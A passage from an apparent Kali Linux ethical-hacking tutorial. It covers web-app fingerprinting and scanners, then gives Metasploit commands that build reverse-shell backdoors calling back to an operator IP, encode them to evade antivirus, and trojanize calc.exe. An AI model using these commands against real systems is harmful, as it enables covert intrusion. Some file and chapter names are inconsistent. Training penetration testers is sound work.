    You can read more about the top 10 vulnerabilities in 2020 on [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/).
    Additionally, OWASP also has local chapters worldwide to create awareness about
    software security. The chapters have security members who discuss new methods
    for testing software, conduct training, develop secure applications, etc. You
    just need to show up at a group meeting to become a member of an OWASP chapter.
    You can visit the OWASP website from the URL mentioned above and click on the
    link that says Chapters to search for local OWASP groups around you.


    # Testing Web Applications


    There are several tools available in Kali Linux at the convenience of a click
    to test web applications, but the power of a tool is great only when you know
    when to use it and how to use it. The penetration testing methodology for testing
    web applications is the same as the first three stages of ethical hacking methodology
    viz. Reconnaissance, Scanning, and Exploitation. Some cases may also make use
    of the last two stages viz. Maintaining Access and Reporting.


    Moreover, while testing a web application, an ethical hacker needs to test every
    web page on the website and not just the home pages or the login pages. If you
    secure the login page of a website, it is not an indication that you have secured
    the entire web application, and you can conclude the testing process. There are
    multiple incentives for an attacker to target websites today. Therefore, you should
    leave no stone unturned while testing a website or a web application.


    Let us go through the steps of testing a web application.


    ## Step 1: Manual Review


    When you run a port scan on a target system, it may return a result that says
    that HTTP is running on port `80`. But this does not necessarily mean that the
    website is running on port `80` as well. You can launch a browser and navigate
    to port `80` of the target system to check if it is serving a website on that
    port. This is true for not just port `80`, but a port scan may return results
    of several web services that are running on ports other than ports `80` or `443`.
    Ensure that you scan through all available links on a website as they may contain
    useful information. If you are prompted for a password by the access control mechanism
    of the website, try out up to 10 passwords or just press the Escape key to see
    if you can directly bypass the authentication. Open the source code for every
    web page and check if there are any notes by the developer. This can be a time
    consuming and boring process, but there are no automation tools in the word that
    can identify all vulnerabilities. Therefore, it is a critical first step to review
    a website or a web application manually.


    ## Step 2: Fingerprinting


    A manual review of a website will not give you details about the web server, the
    web application, or the operating system. Fingerprinting using Kali Linux can
    help you determine all three of these.


    ### NetCat (nc)


    NetCat is a tool available in Kali Linux that can be used as a fingerprinting
    tool as well as a listener for incoming connections. The syntax to use the `NetCat`
    command on a Kali Linux terminal is as follows.


    ```

    nc {host} {port}

    ```

    Example: `nc 192.168.56.102 80`


    This command will establish a connection with the host at IP `192.168.56.102`,
    but no results will be returned until the command is sent across to the webserver.
    There are several techniques for fingerprinting with `NetCat`. You can use the
    following commands to fetch you information about the web server and the operating
    system of the target system.


    ```

    nc 192.168.56.102 80

    HEAD / HTTP/1.0

    ```

    Press the Enter key twice.


    In the result of this command in our example, the target system was running Apache
    2.2 on an Ubuntu Linux operating system and with PHP version `5.2.4-2ubuntu5.10`.
    This information will help an ethical hacker to narrow down the tools and attacks
    they want to use against a target system.


    ### SSLScan (sslscan)


    If you see that a website is using an SSL certificate, it is good to understand
    the kind of SSL encryption being used by the website. A lock symbol in the address
    bar of your web browser just before the URL of a website is an indicator that
    a website is using an SSL certificate.


    ![](Image00006.jpg)


    The `SSLScan` tool queries services on a server for TLSv1, SSLv2, and SSLv3, checks
    if there are any preferred ciphers, and returns the SSL certificate being used
    by the website. The `sslscan` command that can be used in a Kali Linux terminal
    is as follows.


    ```

    sslscan {ipaddress} {port}

    ```

    Example: `sslscan 192.168.56.102 80`


    ## Step 3: Scanning


    Automated scanning will help reduce the time required to scan an entire system
    for vulnerabilities. There are several applications available to scan web servers,
    and a good ethical hacker should not rely on just a single application. A single
    application can never uncover thousands of security flaws and list down all the
    vulnerabilities of a system. It is a good practice to use at least two or three
    tools to scan web applications. Scanning applications such as Nessus, WebInspectm,
    and Retina are industry leaders but are expensive. Kali Linux has a set of inbuilt
    scanning tools that can be used for the purpose of scanning.


    Let us go through a few of them.


    ### Arachni


    The `Arachni` tool is a web application scanner that runs from a graphical user
    interface just like the Nessus. The only difference is that unlike Nessus, `Arachni`
    can perform a single scan on a single host on a single port at a given time. If
    the target system has multiple web services on multiple ports, you will need to
    repeat the scan every time with new port. For example, if `http://helloworld.com`
    has a web service hosted on port `80` and `phpMyAdmin` is running on port `443`
    (HTTPS), you will have to run individual scans on `Arachni`. However, the `Arachni`
    scan is highly customizable. There are several settings and plugins available
    for `Arachni` that allow specific scanning. All plugins are enabled by default.
    `Arachni` also supports reporting in a click to export reports in all file formats.


    You can launch the `Arachni` web application scanner in Kali Linux as follows.
    Click on Applications > Kali Linux > Web Applications > Vulnerability Scanners
    > `arachnid_web`


    ![](Image00007.jpg)


    This will launch a terminal window indicating that the `Arachni` service is starting
    up. Open the browser in Kali Linux and navigate to [http://127.0.0.1:4567](http://127.0.0.1:4567)
    to access the web interface for `Arachni` that looks as follows.


    ![](Image00008.jpg)


    To launch a scan on a target system, enter the host IP into the URL text box and
    click on `Scan` button.


    ![](Image00009.jpg)


    The process will be attached to `Dispatchers` when the scanner is running. You
    can run multiple dispatchers at the same time. If you want to run a scan on more
    web services, you can start another scan simultaneously from `Scan` tab. When
    you have ongoing scans, you can click on `Dispatchers` tab. After all scans complete,
    Arachni will automatically switch you over to `Reports` tab. An ethical hacker
    can export reports from this tab in popular file formats. There is a separate
    report for every scan that executed. The reports also provide bar and pie charts.


    ![](Image00010.jpg)(Image00011.jpg)


    `Arachni` has two categories of reports: `Trusted` and `Untrusted`. Vulnerabilities
    that appear under `Trusted` reports are accurate because the application did not
    receive any unusual responses from the webserver during the scan. Vulnerabilities
    under `Untrusted` reports may be false-positives and need manual review.


    ### w3af


    `w3af` is another lightweight scanner that is available for free in Kali Linux.
    The OWASP security community developed it. The reporting feature of this tool
    has limited options opposed to `Arachni` but can still be used as a good starter
    kit for vulnerability scanning in web servers. The biggest advantage ethical hack
    with `w3af` is it has multiple plugins available and can be downloaded from the
    Internet. An ethical hacker needs to have an Internet connection to conduct a
    test using `w3af`. If there is no Internet, this test will produce a lot of errors
    because the plugins pull scripts from the Internet while the test is scanning
    a host in real-time.


    You can launch the `w3af` application in Kali Linux as follows. Click on Applications
    > Kali Linux > Web Applications > Vulnerability Scanners > `w3af`


    ![](Image00012.jpg)


    This will launch `w3af` graphical interface that will have an empty profile with
    no plugins. You can create a new profile by selecting the required plugins and
    then clicking on `Profiles` > `Save As` in the menu bar. You can also use a set
    of predefined profiles that are available. You can click on a profile such as
    `OWASP_TOP10` and use it for a scan. You can have granular control over the plugins
    available for `w3af`. You can customize predefined plugin before launching a scan
    as well. However, note that executing a scan without an Internet connection is
    a trial and error method. There is another plugins section under the main selection
    window. These plugins can be used for reporting. All the reports generated will
    be saved to `/root/` by default. We have selected the `OWASP_TOP10` profile for
    our scanning example. We have also turned off the discovery plugin option for
    our scan and we have activated HTML reporting.


    ![](Image00013.jpg)


    We will enter a target system for the scan and click on `start` button. The scan
    will return limited results as we have not activated any plugins. If you wish
    to view the results that were generated in the HTML format, you can simply launch
    a web browser and navigate to `file:///root/report.html`.


    ### Nikto


    `Nikto` is another simple scanner available in Kali Linux that can be used to
    scan web servers and web applications. Again this tool allows you to scan only
    one host in every scan, but the `output` command in the tools allows you to track
    the summaries of each scan. You can generate reports in all file formats and use
    it as an input to `Metasploit` as well. Most of the vulnerabilities discovered
    by `Nikto` reference the Open Source Vulnerability Database (OSVDB).


    # Webssploit Chapter Seven: Maintaining Access


    ![](Image00003.jpg)


    Maintaining Access is the fourth stage of the penetration testing lifecycle. The
    chapter will take you through actions performed after exploitation to maintain
    access to a compromised target system. Exploiting a computer system or a network
    is amazing, but the goal of an ethical hacker is to figure out a way to maintain
    access to the target system after exploiting it. There are various methods to
    maintain access with an exploited system, but they all share a common motive:
    to reduce the time and effort taken to keep attacking the same machine again after
    it has already been compromised in the first attempt. Access to a compromised
    system may be required again after the first attempt if an ethical hacker is working
    with a team, and the other members need to access the target system at some point.


    Maintaining Access can be called a secondary art form for an ethical hacker that
    requires just as much thought as exploitation. In this chapter, we will cover
    the basic concepts that are followed by ethical hackers to maintain access with
    a compromised system and continue an established session with the target system.
    Let us go through the various methods that are used to maintain access and also
    the tools available to an ethical hacker that can be used in these various methods.


    ## Backdoors


    A backdoor is a necessary tool, and therefore, an ethical hacker will have to
    generate, upload, and execute backdoors on a compromised system. As discussed
    earlier, backdoors do not necessarily need to be hidden in genuine programs as
    the case of Trojan, but Trojans may contain backdoors. We will go through sections
    that will teach you to create a backdoor and a Trojan as well so that you understand
    the differences between the two. At this point, you can launch a terminal window
    in your Linux system so you can follow the steps with. To begin, you need first
    to create a directory called `backdoors`. You can use the following command:


    ```

    mkdir backdoors

    ```


    ### Backdoors using Metasploit


    As we have already learned in the previous chapter, `Metasploit` is a very powerful
    framework. `Metasploit` GUI is very user friendly, but it is even more impressive
    on the command line. The `msfpayload` command on Kali Linux terminal will create
    binaries that can be used against Windows systems, Linux systems, and even web
    applications. Moreover, the output of `msfpayload` command can be provided as
    input to `msfencode` tools to encode these binaries so they can evade detection
    by virus scanners.


    ### Creating an Executable Binary (Unencoded)


    The `msfpayload` command will work with every payload that is available within
    the `Metasploit` framework. You can use the `msfpayload -l` command to list down
    the available payload. Our example will be using the `windows/meterpreter/reverse_https`
    payload.


    `This` command shows you the fields that need to be set when you want to convert
    a payload into an executable binary. `msfpayload` lets you embed the payloads
    into the following formats:

    - Perl

    - Ruby

    - C

    - C Sharp

    - Raw

    - Executable

    - Javascript

    - Dynamic Link Library

    - War

    - DBA

    - Python


    With all necessary information at hand, an ethical hacker can create an executable
    binary using the following command. Note: This is one command and has to go on
    a single line.


    ```

    msfpayload windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} > /root/backdoors/unencoded-payload.exe

    ```


    ### Creating an Executable Binary (Encoded)


    You can just pipe the `msfpayload` command used in the unencoded example to the
    `msfencode` tool to encode your payload. This can be done through the following
    command:


    ```

    msfpayload windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} R | msfencode
    -e x86/countdown -c 2 -t raw | msfencode -t exe -e x86/shikata_ga_nai -c 3 -k
    -o /root/backdoors/encoded-payload.exe

    ```

    The image below shows the output of this command.


    ### Encoded Trojan Horse


    We have discussed a few backdoors that can execute without any user interaction
    earlier in the book. However, a trojan horse appears to be a genuine program that
    a user may need to use for their daily tasks. Our example uses the `calc.exe`
    file, which executes the calculator application in Windows. Note that we are performing
    this on Windows XP. We will first copy the `calc.exe` file from the Windows operating
    system files to an external drive. We are reiterating that we are using the Windows
    XP binary of `calc.exe`, as not all binaries in the Windows platform are vulnerable
    to Trojan attacks. The same calculator binary from a Windows 7 platform cannot
    be embedded with a Trojan. Therefore, executing this on a `calc.exe` file from
    Windows 7 will not affect a user at all. The other parameters that an ethical
    hacker should consider are firewalls, detection systems, and the level of encoding.
    The trial and error approach is encouraged, as every Trojan doesn''t need to succeed.
    The command is as follows:


    ```

    msfpayload windows/meterpreter/reverse_tcp {YOUR_IP} {PORT} R | msfencode -e x86/countdown
    -c 2 -t raw | msfencode -x /media/{EXTERNAL_USB_DRIVE}/calc.exe -t exe -e x86/shikata_ga_nai
    -c 3 -k -o /root/backdoors/Trojan-calc.exe

    ```

    This command will successfully convert the `cal.exe` file into a `Trojan-smd-payload.exe`
    executable Trojan. The ethical hacker can now use one of the many methods to upload
    this file to the target’s system, and the Trojan will be executed when the user
    interacts with this file.


    ### Setting up a Metasploit Listener


    We have discussed backdoors and Trojans in the previous section that will execute
    on the target’s system. However, there will be times when these programs require
    further instructions, and they will call home for these instructions. An ethical
    hacker can set up a `Metasploit Listener` to respond to these calls. This is a
    simple task, as the `Metasploit` framework offers a built-in solution to set up
    a listener. You can use the following command step by step to set up a `Metasploit`
    listener via the Kali Linux terminal.

